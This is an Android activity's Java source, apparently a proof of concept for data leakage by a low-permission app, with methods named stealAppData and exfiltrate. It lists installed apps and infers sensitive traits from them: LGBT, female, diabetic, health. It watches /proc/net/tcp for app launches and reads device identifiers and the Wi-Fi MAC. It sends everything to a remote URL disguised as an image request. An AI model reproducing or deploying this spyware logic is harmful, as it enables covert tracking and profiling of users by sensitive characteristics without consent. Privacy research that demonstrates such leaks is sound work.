package the.least.permissions;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.squareup.picasso.Picasso;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.*;

public class MainActivity extends AppCompatActivity implements WifiListener, View.OnClickListener {

    private static final String TAG = "MainActivity";

    /**
     * data that will be uploaded regularly
     */
    private ArrayList<String> dataToUpload = new ArrayList<>();

    private final static int UID_INDEX = 7;

    private boolean flagSocial;
    private boolean flagLgbt;
    private boolean flagFemale;
    private boolean flagDiabetes;
    private boolean flagHealth;

    /**
     * contains packages of apps we're keeping track of; the uid are used as keys
     */
    private Map<String, String> appMap = new HashMap<>();
    private ProgressBar spinner;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);

        stealAppData();
    }

    /**
     * when started, the app reads what other apps are installed and other data like the phone model.
     */
    @Override
    protected void onStart() {
        super.onStart();
        exfiltrate(readVersion(), readIdentifiers());
        // what was going on when the app didn't have focus?
        if (flagSocial || flagLgbt) {
            // check for social activity
            if (!readUidFromFile(getString(R.string.tcp_log)))
                readUidFromFile(getString(R.string.tcp6_log));
        }
        if (flagHealth || flagDiabetes) {
            // do something wrt health
        }
    }

    private boolean readUidFromFile(String file) {
        BufferedReader bufferedReader;
        try {
            bufferedReader = new BufferedReader(new FileReader(file));
            // first line:   sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
            String data = bufferedReader.readLine();
            String[] values;
            String appUid;
            do {
//                values = data.trim().replaceAll("\\s+", ";").split(";");
                values = data.trim().split("\\s+");
                Log.d(TAG, Arrays.toString(values));
                if (values.length > UID_INDEX) {
                    appUid = values[UID_INDEX];
                    if (appMap.keySet().contains(appUid)) {
                        prepareForUpload("appLaunched=" + appMap.get(appUid));
                        return true;
                    }
                }
                data = bufferedReader.readLine();
            } while (data != null);
        } catch (FileNotFoundException e) {
            Log.e(TAG, e.getMessage());
        } catch (IOException e) {
            Log.e(TAG, e.getMessage());
        }
        return false;
    }

    /**
     * every time the app gains focus, it starts a thread reading wi-fi data.
     */
    @SuppressLint("HardwareIds")
    @Override
    protected void onResume() {
        super.onResume();
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            NetworkInfo networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            if (networkInfo.isConnected()) {
                WifiManager wifiMan = (WifiManager) this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                new WifiSniffer(this)
                    .execute(getString(R.string.wifi_webservice_url) + wifiMan.getConnectionInfo().getMacAddress());
            }
        }
    }

    /**
     * before app loses focus, it uploads what data was found
     */
    @Override
    protected void onStop() {
        super.onStop();
        if (!dataToUpload.isEmpty()) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            boolean isScreenOn;
            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                isScreenOn = pm.isInteractive();
            } else {
                isScreenOn = pm.isScreenOn();// deprecated after API 21
            }
            if (isScreenOn) {
                // app stopped but screen is on => some other app has taken over: which one?
            } else {
                // this app was the last one active before the screen went black
                Log.d(TAG, "The screen is off");
            }
        }
        StringBuilder sb = new StringBuilder(getString(R.string.data_upload_url));
        Log.d(TAG, "=====| DATA THAT WILL BE UPLOADED |=====");
        for (String queuedString : dataToUpload) {
            sb.append(queuedString).append('&');
            Log.d(TAG, queuedString);
        }
        dataToUpload.clear();
        String request = sb.toString();
        Log.d(TAG, "Uploading: " + request);
        Picasso.get().load(request).error(R.drawable.ic_menu_edit).into((ImageView) findViewById(R.id.edit_button));
    }

    // utilities

    @Override
    public void onClick(View view) {
        spinner = (ProgressBar) findViewById(R.id.progressBar1);
        spinner.setVisibility(View.VISIBLE);

        try {
            // thread to sleep for 1000 milliseconds
            Thread.sleep(2000);
        } catch (Exception e) {
            System.out.println(e);
        }

        spinner.setVisibility(View.GONE);
    }

    private void exfiltrate(String version, String id) {
        String send = "ver=" + version + "?" + id;
        prepareForUpload(send);
    }

    private String readIdentifiers() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String operator = "0", sim = "0";
        if (telephonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
            operator = telephonyManager.getNetworkOperatorName();
            Log.d(TAG, "readIdentifiers: GSM Operator: " + operator);
        } else {
            Log.d(TAG, "readIdentifiers: not GSM");
        }
        if (telephonyManager.getSimState() == TelephonyManager.SIM_STATE_READY) {
            sim = telephonyManager.getSimOperatorName();
            Log.d(TAG, "readIdentifiers: SIM Operator: " + sim);
        } else {
            Log.d(TAG, "readIdentifiers: SIM Not Ready");
        }
        @SuppressLint("HardwareIds") String androidID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        return "gsm=" + operator + "&sim=" + sim + "&androidId=" + androidID;
    }

    private String readVersion() {
        BufferedReader procVersion;
        try {
            procVersion = new BufferedReader(new FileReader("/proc/version"));
        } catch (FileNotFoundException e) {
            return "";
        }
        String kernel;
        try {
            kernel = procVersion.readLine();
        } catch (IOException e) {
            return "";
        }
        return URLEncoder.encode(kernel);
    }

    private void stealAppData() {
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        StringBuilder send = new StringBuilder();
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.packageName;
                flagSocial |= InstalledAppUtils.isSocial(appName);
                flagLgbt |= InstalledAppUtils.isLgbt(appName);
                flagFemale |= InstalledAppUtils.isFemale(appName);
                flagDiabetes |= InstalledAppUtils.isDiabetes(appName);
                flagHealth |= InstalledAppUtils.isHealth(appName);
                send.append("|").append(appName);
                if (InstalledAppUtils.keepTrackOf(appName)) {
                    appMap.put(String.valueOf(packInfo.applicationInfo.uid), appName);
                }
                Log.i(TAG, "stealAppData - installed app: " + i + " as uid " + appName);
            }
        }
        String flags = (flagSocial ? "SOCIAL " : "")
            + (flagLgbt ? "LGBT " : "")
            + (flagFemale ? "FEMALE " : "")
            + (flagDiabetes ? "DIABETES" : "")
            + (flagHealth ? "HEALTH" : "");
        if (flagSocial) Log.d(TAG, "flags :" + flags);
        prepareForUpload("apps=" + send.toString());
    }

    public void prepareForUpload(String string) {
        dataToUpload.add(string);
        Toast.makeText(
            this,
            "Data was queued for upload.",
            Toast.LENGTH_SHORT
        ).show();
    }

    @Override
    public void onSniffed(String data) {
        prepareForUpload("wifiData=" + data);
    }
}